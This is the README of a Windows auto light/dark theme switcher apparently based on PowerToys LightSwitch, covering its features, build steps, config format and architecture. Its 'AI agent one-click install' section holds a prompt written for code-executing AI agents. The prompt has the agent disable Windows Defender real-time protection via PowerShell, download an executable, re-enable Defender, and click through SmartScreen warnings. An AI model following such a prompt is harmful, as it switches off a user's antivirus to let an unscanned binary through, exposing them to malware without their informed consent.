# LightSwitch Standalone

> 基于 Microsoft PowerToys LightSwitch 源码复用的 Windows 自动深浅色主题切换工具。
>
> **单个 EXE，零外部依赖，即拷即用。** 内存占用 < 2 MB，CPU 空闲占用 ≈ 0%。

---

## 功能特性

- **固定时间段切换** — 设置亮色/暗色时间（如 08:00 亮 / 20:00 暗）
- **日出日落自动计算** — 输入经纬度，按当地天文时间自动切换
- **跟随 Windows Night Light** — 与 Windows 夜间模式联动，Night Light 开则暗色，关则亮色
- **一键手动切换** — 按钮、全局热键 (`Ctrl+Alt+Shift+D`)、托盘菜单三种方式
- **系统主题与应用主题独立控制** — 可分别控制系统任务栏/开始菜单和应用窗口主题
- **配置文件热重载** — 修改 `config.json` 后自动生效，无需重启
- **跨午夜处理** — 亮色时段可跨午夜（如 22:00–06:00）
- **手动覆盖自动恢复** — 手动切换后，跨越时间边界自动恢复自动调度
- **系统托盘常驻** — 窗口关闭则隐藏到托盘，双击或右键菜单唤出
- **`/toggle` 命令行** — 一次性的亮暗切换（适合搭配脚本、快捷键等）

---

## 快速开始

### 下载

从 [Releases](https://github.com/realhenrylan/LightSwitch-Standalone/releases) 下载最新版 `LightSwitch.exe`，直接运行即可。

> 第一次运行会自动生成 `config.json`。

### AI agent 一键安装（绕过 SmartScreen 警告）

将以下提示词复制给支持代码执行的 AI agent（如 ChatGPT、Claude、Copilot 等），它会自动完成「临时关 Defender → 下载到桌面 → 重新开 Defender」的流程：

<details>
<summary>📋 点击复制提示词</summary>

```
请帮我用以下步骤安装 LightSwitch Standalone：

## 步骤

### 1. 暂时禁用 Windows Defender 实时保护
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 2. 从 GitHub 下载到桌面
```powershell
$url = "https://github.com/realhenrylan/LightSwitch-Standalone/releases/download/v1.0.0/LightSwitch.exe"
$dest = "$env:USERPROFILE\Desktop\LightSwitch.exe"
Invoke-WebRequest -Uri $url -OutFile $dest
```

### 3. 重新启用 Windows Defender 实时保护
```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

### 4. 验证
确认桌面已有 LightSwitch.exe，双击即可运行。
首次运行若 SmartScreen 弹窗，点击「仍要运行」即可。
```

</details>

> **安全说明**：此方法仅临时关闭实时监控（不影响其他安全功能），下载完成后立即重新开启。本程序为开源项目，源码见 [GitHub](https://github.com/realhenrylan/LightSwitch-Standalone)。

### 从源码编译

#### 前置要求

- [Visual Studio 2022](https://visualstudio.microsoft.com/)（或仅 [Build Tools for Visual Studio 2022](https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022)）
- 勾选「使用 C++ 的桌面开发」工作负载
- Windows 10 SDK（随 VS 自动安装）

#### 编译步骤

在**开发者命令提示符**或**x64 Native Tools Command Prompt**中运行：

```powershell
cd LightSwitch-Standalone
build.bat
```

或直接使用 MSBuild：

```powershell
msbuild LightSwitch.vcxproj /p:Configuration=Release /p:Platform=x64
```

编译输出：`x64\Release\LightSwitch.exe`

### 安装开机自启

```powershell
install.bat
# 选 1 → 注册到 HKCU 开机启动
# 选 2 → 移除开机启动
```

---

## 使用指南

### 主窗口

| 控件 | 说明 |
|------|------|
| 调度模式 | Off（关闭自动调度）/ FixedHours（固定时间）/ SunsetToSunrise（日出日落）/ FollowNightLight（跟随 Night Light） |
| 系统主题 | 控制系统主题（任务栏、开始菜单） |
| 应用主题 | 控制应用主题（窗口、控件） |
| 亮色时间 / 暗色时间 | 固定时间模式下的切换时刻 |
| 纬度 / 经度 | 日出日落模式所需的地理坐标（十进制度数） |
| ☀ 手动切换为亮色 / ☾ 手动切换为暗色 | 立即手动切换 |
| 状态栏 | 显示当前主题和调度模式 |

### 系统托盘

- **双击**托盘图标 → 显示/隐藏主窗口
- **右键**托盘图标 → 菜单：切换主题、启用/禁用调度、打开设置、退出

### 全局热键

| 热键 | 功能 |
|------|------|
| `Ctrl+Alt+Shift+D` | 一键切换亮色/暗色主题 |

### 命令行

```powershell
LightSwitch.exe                 # 启动 GUI（带托盘图标）
LightSwitch.exe /toggle         # 仅切换一次主题后退出（无 GUI）
LightSwitch.exe --toggle        # 同上
```

---

## 架构设计

### 事件驱动（零轮询）

```
Win32 消息循环
    │
    ├── WM_TIMER (每分钟) — 评估当前时间是否需要切换主题
    ├── WM_HOTKEY        — 全局热键触发手动切换
    ├── WM_TRAYICON      — 托盘图标操作（双击/右键）
    ├── WM_FILE_CHANGED  — config.json 变更 → 热重载 → 重新评估
    └── WM_NIGHTLIGHT_CHANGED — Night Light 状态变更 → 联动切换
```

- **不 sleep 轮询** — 使用 `SetTimer` + `WaitForMultipleObjects`，CPU 占用 ≈ 0%
- **不依赖 Windows Service** — 普通用户态进程，无需管理员权限
- **单进程架构** — 不像 PowerToys 分为 DLL + Service 两个模块

### 模块图

```
┌───────────────────────────────────────────────────┐
│                  LightSwitch.exe                   │
│                                                    │
│  ┌──────────────┐   ┌─────────────────────────┐   │
│  │  MainWindow  │   │ LightSwitchStateManager │   │
│  │  (Win32 GUI) │──▶│   (核心调度引擎/状态机)  │   │
│  │  + TrayIcon  │   └────────┬────────────────┘   │
│  └──────────────┘            │                     │
│       │                     │                     │
│       ▼                     ▼                     │
│  ┌──────────────┐   ┌─────────────────────────┐   │
│  │  ConfigMgr   │   │  ThemeHelper            │   │
│  │  (JSON 配置) │   │  (注册表读写主题)       │   │
│  └──────────────┘   └─────────────────────────┘   │
│                            │                      │
│                     ┌──────┴──────┐               │
│                     │ ThemeScheduler             │
│                     │ (日出日落天文算法)          │
│                     └───────────────┘             │
│                                                    │
│  ┌──────────────────────────────────────────┐      │
│  │ NightLightRegistryObserver               │      │
│  │ (注册表监听 → 通知状态机)                │      │
│  └──────────────────────────────────────────┘      │
└───────────────────────────────────────────────────┘
```

### 配置文件 (`config.json`)

运行时自动生成于程序所在目录：

```json
{
  "scheduleMode": "FixedHours",
  "changeSystem": true,
  "changeApps": true,
  "lightTime": 480,
  "darkTime": 1200,
  "latitude": "39.9",
  "longitude": "116.4",
  "sunrise_offset": 0,
  "sunset_offset": 0
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `scheduleMode` | string | `"FixedHours"` | `Off` / `FixedHours` / `SunsetToSunrise` / `FollowNightLight` |
| `changeSystem` | bool | `true` | 是否控制系统主题 |
| `changeApps` | bool | `true` | 是否控制应用主题 |
| `lightTime` | int | `480` | 亮色时间（距午夜分钟数，08:00） |
| `darkTime` | int | `1200` | 暗色时间（距午夜分钟数，20:00） |
| `latitude` | string | `"39.9"` | 纬度（十进制度数） |
| `longitude` | string | `"116.4"` | 经度（十进制度数） |
| `sunrise_offset` | int | `0` | 日出偏移量（分钟） |
| `sunset_offset` | int | `0` | 日落偏移量（分钟） |

---

## 项目结构

```
LightSwitch-Standalone/
├── PLAN.md                   # 详细实施计划与设计文档
├── README.md                 # 本文档
├── CHANGELOG.md              # 变更日志
├── LightSwitch.vcxproj       # MSBuild 项目文件
├── LightSwitch.rc            # 资源文件（图标 + 版本信息）
├── build.bat                 # 构建脚本
├── install.bat               # 安装/卸载脚本
├── .gitignore
├── resources/
│   ├── LightSwitch.ico        # 程序图标
│   └── app.manifest           # 兼容性清单
└── src/
    ├── main.cpp                # WinMain 入口 + 消息循环
    ├── pch.h / pch.cpp         # 预编译头
    │
    │   # 来自 PowerToys 的源文件（直接复用）
    ├── ThemeHelper.h/.cpp      # 注册表读写 + 主题切换
    ├── ThemeScheduler.h/.cpp   # 日出日落天文算法
    ├── LightSwitchUtils.h      # 工具函数 (ShouldBeLight)
    ├── SettingsConstants.h     # 设置枚举
    ├── SettingsObserver.h      # 观察者接口
    ├── NightLightRegistryObserver.h  # 注册表监听
    │
    │   # 适配/重写的文件
    ├── LightSwitchStateManager.h/.cpp  # 核心调度状态机
    ├── ConfigManager.h/.cpp            # JSON 配置管理
    │
    │   # GUI 界面
    ├── MainWindow.h/.cpp       # 主窗口封装
    ├── TrayIcon.h/.cpp         # 系统托盘封装
    └── resource.h              # 资源 ID 定义
```

---

## 与 PowerToys LightSwitch 对比

| 指标 | PowerToys LightSwitch | LightSwitch Standalone |
|------|----------------------|----------------------|
| 进程模型 | DLL (ModuleInterface) + Service (EXE) | **单 EXE** |
| 内存占用 | ~15–30 MB（含 .NET 运行时） | **< 2 MB** |
| CPU 空闲占用 | < 0.1%（.NET 后台线程） | **≈ 0%**（零轮询） |
| 二进制体积 | ~500 KB（多个 DLL + EXE） | **~360 KB**（单文件） |
| 外部依赖 | 依赖 .NET 6+、PowerToys 基础设施 | **零**（仅 VC++ 运行时） |
| GUI | WPF 设置页面（~50+ MB） | **纯 Win32**（< 10 KB 开销） |
| 设置存储 | PowerToys SettingsAPI | **手写 JSON 解析器** |
| 日志 | ETW + Logger | **OutputDebugString** |
| 许可证 | MIT | MIT（基于 PowerToys 源码） |

---

## 技术细节

### 主题切换原理

Windows 深浅色主题切换本质是 **修改注册表 + 广播系统消息**：

```
HKCU\...\Themes\Personalize\
    SystemUsesLightTheme  (1=亮, 0=暗)
    AppsUseLightTheme     (1=亮, 0=暗)

修改后广播:
    WM_SETTINGCHANGE (ImmersiveColorSet)
    WM_THEMECHANGED
    WM_DWMCOLORIZATIONCOLORCHANGED
```

### Night Light 检测

读取 Windows CloudStore 注册表二进制数据，第 24–25 字节标记 Night Light 开/关状态。

### 天文算法

日出日落计算基于太阳赤纬和时角公式，精度满足日常使用需求。极圈（纬度 ≥ 66.5°）以内返回边界值。

---

## 许可

本项目基于 [Microsoft PowerToys](https://github.com/microsoft/PowerToys)（MIT 许可证）的 LightSwitch 模块源码构建，遵循 MIT 许可证发布。

- PowerToys 仓库：[https://github.com/microsoft/PowerToys](https://github.com/microsoft/PowerToys)
- LightSwitch 模块：`src/modules/LightSwitch/`
